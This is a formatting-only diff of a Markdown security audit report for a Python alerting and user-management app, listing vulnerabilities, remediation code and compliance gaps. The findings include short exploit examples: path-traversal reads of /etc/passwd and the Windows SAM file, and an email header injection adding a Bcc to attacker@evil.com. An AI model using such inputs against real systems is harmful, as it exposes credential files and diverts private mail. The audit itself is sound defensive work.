@@ -33,7 +33,7 @@ This audit identified **CRITICAL** security vulnerabilities that require immedia
 **Severity:** P0 - CRITICAL  
 **Impact:** Complete system compromise, API abuse, unauthorized access
 
-#### Evidence:
+#### Evidence
 
 ```env
 # ⚠️ REDACTED - Credentials have been ROTATED after this audit
@@ -45,28 +45,33 @@ FERNET_KEY=[REDACTED - Base64 encoded key - ROTATED]
 
 **NOTE**: All credentials shown above were exposed in git history and have been **IMMEDIATELY ROTATED**. The values shown are for documentation purposes only and are no longer valid.
 
-#### Risk Assessment:
+#### Risk Assessment
+
 - ✅ `.env` file is in `.gitignore` (GOOD)
 - ❌ **BUT** file currently exists in working directory and contains real credentials
 - ❌ Credentials appear to be production/real values, not examples
 - ❌ If accidentally committed, credentials are publicly exposed on GitHub
 
-#### Immediate Actions Required:
+#### Immediate Actions Required
+
 1. **URGENT**: Verify if `.env` has been committed to git history
+
    ```bash
    git log --all --full-history -- .env
    ```
-2. **If committed**: 
+
+1. **If committed**: 
    - Rotate ALL credentials immediately (OpenAI API key, Gmail password, Fernet key)
    - Use BFG Repo-Cleaner to remove from git history
    - Force push cleaned history
-3. **Regardless**: 
+1. **Regardless**: 
    - Move to `.env.example` with placeholder values
    - Create new `.env` with rotated credentials
    - Add `.env` to `.gitignore` (already done, verify)
    - Use environment-specific secrets manager in production
 
-#### Estimated Cost of Breach:
+#### Estimated Cost of Breach
+
 - OpenAI API abuse: $1,000+ in unauthorized charges
 - Email account compromise: Phishing attacks, data theft
 - Encryption key exposure: All encrypted data compromised
@@ -81,7 +86,7 @@ FERNET_KEY=[REDACTED - Base64 encoded key - ROTATED]
 **Severity:** P1 - HIGH  
 **Impact:** Data breach, privacy violation, compliance failure (GDPR, CCPA)
 
-#### Vulnerable Files:
+#### Vulnerable Files
 
 | File | Data Type | Encryption | Risk |
 |------|-----------|-----------|------|
@@ -93,7 +98,7 @@ FERNET_KEY=[REDACTED - Base64 encoded key - ROTATED]
 | `data/command_override_config.json` | Override states, password hash | ❌ None | CRITICAL |
 | `data/command_override_audit.log` | Admin actions | ❌ None | MEDIUM |
 
-#### Evidence from `emergency_alert.py`:
+#### Evidence from `emergency_alert.py`
 
 ```python
 def save_contacts(self):
@@ -102,7 +107,7 @@ def save_contacts(self):
         json.dump(self.emergency_contacts, f)  # ❌ NO ENCRYPTION
 ```
 
-#### Evidence from `user_manager.py`:
+#### Evidence from `user_manager.py`
 
 ```python
 def save_users(self):
@@ -111,7 +116,7 @@ def save_users(self):
         json.dump(self.users, f)  # ❌ NO ENCRYPTION (contains password_hash)
 ```
 
-#### Evidence from `security_resources.py`:
+#### Evidence from `security_resources.py`
 
 ```python
 def save_favorite(self, username, repo):
@@ -122,14 +127,16 @@ def save_favorite(self, username, repo):
         json.dump(favorites, f)  # ❌ NO ENCRYPTION
 ```
 
-#### Compliance Violations:
+#### Compliance Violations
+
 - **GDPR Article 32**: Failure to implement appropriate security measures
 - **CCPA Section 1798.150**: Inadequate protection of personal information
 - **HIPAA** (if health data): Encryption at rest required
 
-#### Remediation:
+#### Remediation
+
 ```python
-# Recommended pattern (already used in location_tracker.py):
+# Recommended pattern (already used in location_tracker.py)
 from cryptography.fernet import Fernet
 
 class SecureStorage:
@@ -157,7 +164,7 @@ class SecureStorage:
 **Severity:** P1 - HIGH  
 **Impact:** SQL injection, XSS, command injection, path traversal
 
-#### Vulnerable Code Patterns:
+#### Vulnerable Code Patterns
 
 **intelligence_engine.py** - No validation on file paths:
 ```python
@@ -169,7 +176,7 @@ def load_data(self, file_path: str) -> bool:
 
 **Exploit Example:**
 ```python
-# Attacker could read any file:
+# Attacker could read any file
 analyzer.load_data("../../../../etc/passwd")
 analyzer.load_data("C:\\Windows\\System32\\config\\SAM")
 ```
@@ -183,7 +190,7 @@ def send_alert(self, username, location_data, message=None):
 
 **Exploit Example:**
 ```python
-# Email header injection:
+# Email header injection
 contacts = {"emails": ["victim@example.com\nBcc: attacker@evil.com"]}
 ```
 
@@ -194,7 +201,7 @@ def get_location_from_ip(self):
         response = requests.get("https://ipapi.co/json/")  # ❌ No timeout
 ```
 
-#### Remediation:
+#### Remediation
 
 ```python
 import re
@@ -233,14 +240,14 @@ def sanitize_input(text: str, max_length: int = 1000) -> str:
 **Severity:** P1 - HIGH  
 **Impact:** Arbitrary file read/write, data tampering, privilege escalation
 
-#### Issues:
+#### Issues
 
 1. **No atomic writes**: Data corruption on crash/interrupt
-2. **No file permissions**: Anyone can read sensitive files
-3. **No file locking**: Race conditions in multi-process environments
-4. **Predictable filenames**: Easy to guess and target
+1. **No file permissions**: Anyone can read sensitive files
+1. **No file locking**: Race conditions in multi-process environments
+1. **Predictable filenames**: Easy to guess and target
 
-#### Evidence from `user_manager.py`:
+#### Evidence from `user_manager.py`
 
 ```python
 def save_users(self):
@@ -251,13 +258,13 @@ def save_users(self):
 
 **Problem:** If process crashes during write, `users.json` is corrupted.
 
-#### Evidence from `emergency_alert.py`:
+#### Evidence from `emergency_alert.py`
 
 ```python
 filename = f"emergency_contacts.json"  # ❌ Fixed location, no permissions check
 ```
 
-#### Remediation:
+#### Remediation
 
 ```python
 import os
@@ -298,7 +305,7 @@ def atomic_write(filename: str, data: dict, permissions: int = 0o600):
 **Severity:** P2 - MEDIUM  
 **Impact:** Man-in-the-middle attacks, credential theft
 
-#### Evidence:
+#### Evidence
 
 ```python
 # location_tracker.py
@@ -327,13 +334,14 @@ response = requests.get(
 **Severity:** P2 - MEDIUM  
 **Impact:** DoS attacks, resource exhaustion, API quota abuse
 
-#### Vulnerable Operations:
+#### Vulnerable Operations
+
 - `LearningPathManager.generate_path()` - Calls OpenAI API with no rate limit
 - `SecurityResourceManager.get_repo_details()` - Calls GitHub API with no limit
 - `LocationTracker.get_location_from_ip()` - External API with no limit
 - `CommandOverrideSystem.request_override()` - No brute force protection
 
-#### Remediation:
+#### Remediation
 
 ```python
 from functools import wraps
@@ -365,7 +373,7 @@ class RateLimiter:
         
         return wrapper
 
-# Usage:
+# Usage
 @RateLimiter(max_calls=10, period=60)
 def generate_path(self, interest, skill_level="beginner"):
     # ...
@@ -379,7 +387,7 @@ def generate_path(self, interest, skill_level="beginner"):
 **Severity:** P2 - MEDIUM  
 **Impact:** Brute force attacks, weak account security
 
-#### Current State:
+#### Current State
 
 ```python
 def create_user(self, username, password, persona: str = "friendly", preferences=None):
@@ -388,12 +396,13 @@ def create_user(self, username, password, persona: str = "friendly", preferences
 ```
 
 **Problems:**
+
 - No minimum length requirement
 - No complexity requirements (uppercase, digits, special chars)
 - No check against common passwords
 - No password history to prevent reuse
 
-#### Remediation:
+#### Remediation
 
 ```python
 import re
@@ -433,7 +442,7 @@ def validate_password_strength(password: str) -> tuple[bool, str]:
 **Severity:** P3 - LOW  
 **Impact:** Information disclosure, easier exploitation
 
-#### Evidence:
+#### Evidence
 
 ```python
 # user_manager.py
@@ -441,7 +450,8 @@ except Exception as e:
     print(f"Encryption error: {str(e)}")  # ❌ May leak system info
 ```
 
-#### Remediation:
+#### Remediation
+
 - Log detailed errors to secure log file
 - Return generic error messages to users
 - Implement structured logging with severity levels
@@ -454,7 +464,7 @@ except Exception as e:
 **Severity:** P3 - LOW  
 **Impact:** XSS, clickjacking, MIME sniffing attacks
 
-#### Recommended Headers:
+#### Recommended Headers
 
 ```python
 from flask import Flask
@@ -476,7 +486,7 @@ Talisman(app,
 
 ## 📊 VULNERABILITY SUMMARY
 
-### By Severity:
+### By Severity
 
 | Severity | Count | Examples |
 |----------|-------|----------|
@@ -486,7 +496,7 @@ Talisman(app,
 | P3 (Low) | 2 | Verbose errors, missing security headers |
 | **Total** | **10** | |
 
-### By Category:
+### By Category
 
 | Category | Issues | Priority |
 |----------|--------|----------|
@@ -501,7 +511,7 @@ Talisman(app,
 
 ## 🎯 COMPLIANCE STATUS
 
-### OWASP Top 10 (2021):
+### OWASP Top 10 (2021)
 
 | Risk | Status | Findings |
 |------|--------|----------|
@@ -518,7 +528,7 @@ Talisman(app,
 
 **Overall OWASP Compliance:** **40%** ❌
 
-### Regulatory Compliance:
+### Regulatory Compliance
 
 | Regulation | Status | Gaps |
 |------------|--------|------|
@@ -541,18 +551,19 @@ Talisman(app,
    - Generate new Fernet key
    - Update `.env.example` with placeholders
 
-2. ✅ **Verify `.env` not in git history**
+1. ✅ **Verify `.env` not in git history**
+
    ```bash
    git log --all --full-history -- .env
    ```
 
-3. ✅ **Implement encryption for sensitive files**
+1. ✅ **Implement encryption for sensitive files**
    - `users.json`
    - `emergency_contacts_{user}.json`
    - `data/access_control.json`
    - `data/command_override_config.json`
 
-4. ✅ **Add input validation**
+1. ✅ **Add input validation**
    - File path validation
    - Email validation
    - SQL injection prevention
@@ -568,19 +579,20 @@ Talisman(app,
    - Add file locking
    - Set restrictive permissions (0o600)
 
-2. ✅ **Add rate limiting**
+1. ✅ **Add rate limiting**
    - OpenAI API calls
    - GitHub API calls
    - Authentication attempts
    - External API calls
 
-3. ✅ **Strengthen password policy**
+1. ✅ **Strengthen password policy**
    - Minimum 12 characters
    - Complexity requirements
    - Common password check
    - Password history (prevent reuse)
 
-4. ✅ **Add timeout to all HTTP requests**
+1. ✅ **Add timeout to all HTTP requests**
+
    ```python
    requests.get(url, timeout=5, verify=True)
    ```
@@ -597,18 +609,18 @@ Talisman(app,
    - Audit trail for sensitive operations
    - Log rotation and retention policy
 
-2. ✅ **Add security headers** (web version)
+1. ✅ **Add security headers** (web version)
    - Content-Security-Policy
    - X-Frame-Options
    - X-Content-Type-Options
    - Strict-Transport-Security
 
-3. ✅ **Implement access control**
+1. ✅ **Implement access control**
    - Role-based permissions
    - Principle of least privilege
    - Session management
 
-4. ✅ **Security testing**
+1. ✅ **Security testing**
    - Static analysis (Bandit, semgrep)
    - Dynamic analysis (OWASP ZAP)
    - Dependency scanning (pip-audit)
@@ -624,17 +636,17 @@ Talisman(app,
    - Anomaly detection
    - Real-time alerting
 
-2. ✅ **Compliance certification**
+1. ✅ **Compliance certification**
    - SOC 2 Type II
    - ISO 27001
    - GDPR compliance audit
 
-3. ✅ **Bug bounty program**
+1. ✅ **Bug bounty program**
    - HackerOne or Bugcrowd
    - Responsible disclosure policy
    - Reward structure
 
-4. ✅ **Security training**
+1. ✅ **Security training**
    - Developer security training
    - Secure coding guidelines
    - Incident response planning
@@ -740,27 +752,27 @@ pip list --outdated
 
 ## 📞 INCIDENT RESPONSE
 
-### If Credentials Are Compromised:
+### If Credentials Are Compromised
 
 1. **Immediately revoke all API keys**
    - OpenAI Dashboard → API Keys → Revoke
    - Change Gmail app password
 
-2. **Audit access logs**
+1. **Audit access logs**
    - Check OpenAI usage logs
    - Check Gmail access logs
    - Review application audit logs
 
-3. **Notify affected users**
+1. **Notify affected users**
    - Disclose breach per GDPR/CCPA requirements
    - Force password resets
 
-4. **Forensic analysis**
+1. **Forensic analysis**
    - Determine scope of breach
    - Identify root cause
    - Document timeline
 
-5. **Implement remediation**
+1. **Implement remediation**
    - Fix vulnerability
    - Improve monitoring
    - Update security policies
@@ -769,20 +781,23 @@ pip list --outdated
 
 ## 📚 REFERENCES
 
-### Security Standards:
-- OWASP Top 10: https://owasp.org/Top10/
-- CWE Top 25: https://cwe.mitre.org/top25/
-- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework
+### Security Standards
 
-### Python Security:
-- Python Security Best Practices: https://python.readthedocs.io/en/stable/library/security_warnings.html
-- Bandit Documentation: https://bandit.readthedocs.io/
-- OWASP Python Security Project: https://owasp.org/www-project-python-security/
+- OWASP Top 10: <https://owasp.org/Top10/>
+- CWE Top 25: <https://cwe.mitre.org/top25/>
+- NIST Cybersecurity Framework: <https://www.nist.gov/cyberframework>
 
-### Compliance:
-- GDPR: https://gdpr-info.eu/
-- CCPA: https://oag.ca.gov/privacy/ccpa
-- SOC 2: https://www.aicpa.org/interestareas/frc/assuranceadvisoryservices/aicpasoc2report.html
+### Python Security
+
+- Python Security Best Practices: <https://python.readthedocs.io/en/stable/library/security_warnings.html>
+- Bandit Documentation: <https://bandit.readthedocs.io/>
+- OWASP Python Security Project: <https://owasp.org/www-project-python-security/>
+
+### Compliance
+
+- GDPR: <https://gdpr-info.eu/>
+- CCPA: <https://oag.ca.gov/privacy/ccpa>
+- SOC 2: <https://www.aicpa.org/interestareas/frc/assuranceadvisoryservices/aicpasoc2report.html>
 
 ---
 
@@ -793,6 +808,7 @@ pip list --outdated
 **Review Frequency:** Quarterly
 
 **Risk Assessment:**
+
 - **Before Remediation:** 8.7/10 (CRITICAL RISK)
 - **After Phase 1:** 5.5/10 (MEDIUM RISK - estimated)
 - **After Phase 2:** 3.0/10 (LOW RISK - estimated)
